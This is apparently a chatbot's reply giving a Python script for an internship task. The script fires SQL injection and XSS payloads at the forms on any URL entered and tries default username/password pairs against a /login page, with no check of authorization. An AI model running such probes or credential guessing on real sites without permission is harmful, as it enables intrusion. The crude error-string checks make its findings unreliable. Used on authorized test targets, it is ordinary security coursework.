# Web-application-penetration-tester
---

Got it! 🔥  
You want a *full Python script* that performs *Web Application Penetration Testing* — targeting:

- *SQL Injection (SQLi) Detection* ✅
- *Cross-Site Scripting (XSS) Detection* ✅
- *Weak Authentication Testing* ✅

---

# 🛡 FULL CODE: WEB APPLICATION PENETRATION TESTER (Python)

Here’s a *full working script* you can submit for your *Prodigy InfoTech Internship Task*:

python
import requests
import sys
from urllib.parse import urljoin

# List of common SQL Injection payloads
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "' OR 1=1 -- ",
    "' OR 1=1#",
    "' OR 1=1/*"
]

# List of common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
]

def test_sql_injection(url, forms):
    print("\n[*] Testing for SQL Injection vulnerabilities...")
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.get("inputs")

        for payload in sql_payloads:
            data = {}
            for input_tag in inputs:
                data[input_tag.get("name")] = payload

            form_url = urljoin(url, action)

            if method == "post":
                res = requests.post(form_url, data=data)
            else:
                res = requests.get(form_url, params=data)

            if "error" in res.text.lower() or "sql" in res.text.lower():
                print(f"[+] Potential SQL Injection vulnerability detected at {form_url}")
                print(f"    Payload: {payload}")
                break

def test_xss(url, forms):
    print("\n[*] Testing for Cross-Site Scripting (XSS) vulnerabilities...")
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.get("inputs")

        for payload in xss_payloads:
            data = {}
            for input_tag in inputs:
                data[input_tag.get("name")] = payload

            form_url = urljoin(url, action)

            if method == "post":
                res = requests.post(form_url, data=data)
            else:
                res = requests.get(form_url, params=data)

            if payload in res.text:
                print(f"[+] Potential XSS vulnerability detected at {form_url}")
                print(f"    Payload: {payload}")
                break

def test_authentication(url):
    print("\n[*] Testing for Insecure Authentication (Common Weak Logins)...")
    common_usernames = ["admin", "test", "root", "user"]
    common_passwords = ["admin", "password", "123456", "root", "test"]

    login_url = urljoin(url, "/login")  # assuming /login endpoint

    for username in common_usernames:
        for password in common_passwords:
            data = {"username": username, "password": password}
            try:
                response = requests.post(login_url, data=data, timeout=5)
                if "invalid" not in response.text.lower() and response.status_code == 200:
                    print(f"[+] Weak credentials found: {username}:{password}")
                    return
            except Exception as e:
                continue
    print("[-] No weak credentials found.")

def get_forms(url):
    from bs4 import BeautifulSoup

    try:
        res = requests.get(url)
        parsed_html = BeautifulSoup(res.text, "html.parser")
        forms = []

        for form in parsed_html.find_all("form"):
            details = {}
            action = form.attrs.get("action")
            method = form.attrs.get("method", "get")
            inputs = []
            for input_tag in form.find_all("input"):
                input_name = input_tag.attrs.get("name")
                input_type = input_tag.attrs.get("type", "text")
                inputs.append({"name": input_name, "type": input_type})
            details['action'] = action
            details['method'] = method
            details['inputs'] = inputs
            forms.append(details)
        return forms
    except Exception as e:
        print(f"[-] Error getting forms: {e}")
        return []

def main():
    print("\n=== Web Application Penetration Tester ===\n")
    target_url = input("Enter the target URL (e.g., http://example.com): ").strip()

    if not target_url.startswith("http"):
        print("[-] Invalid URL. Please include http:// or https://")
        sys.exit()

    print(f"\n[+] Target: {target_url}")

    forms = get_forms(target_url)

    if forms:
        print(f"[+] Found {len(forms)} forms on the page.")
    else:
        print("[-] No forms found.")

    test_sql_injection(target_url, forms)
    test_xss(target_url, forms)
    test_authentication(target_url)

    print("\n[+] Testing completed.")

if __name__ == "__main__":
    main()


---

# 📂 Folder Structure to Upload

You should create this structure for GitHub:


PRODIGY_CS_05/
│
├── webapp_penetration_tester.py    <-- (this script)
├── README.md                       <-- (basic instructions)
└── example_run_output.png          <-- (screenshot running the script)


---

# 📜  README.md

markdown
# Web Application Penetration Tester

A simple penetration testing tool built for Prodigy InfoTech Internship (Cyber Security Track).

## Features
- SQL Injection Detection
- Cross-Site Scripting (XSS) Detection
- Insecure Authentication Testing

## How to Use
Install dependencies:

pip install requests beautifulsoup4


Run the script:

python webapp_penetration_tester.py


Input the target URL (example: `http://testphp.vulnweb.com/`).

## Example
- Finds SQL Injection vulnerabilities by testing forms.
- Detects XSS vulnerabilities.
- Checks for weak username/password combinations.

---


---

# ⚡ Requirements

Install missing libraries if you don't have them:

pip install requests beautifulsoup4


---

---

# 🚀 Bonus Tip (for Extra Marks)

You can add *command-line arguments* using argparse to make it even cooler!

Example:


python webapp_penetration_tester.py --url http://example.com

---
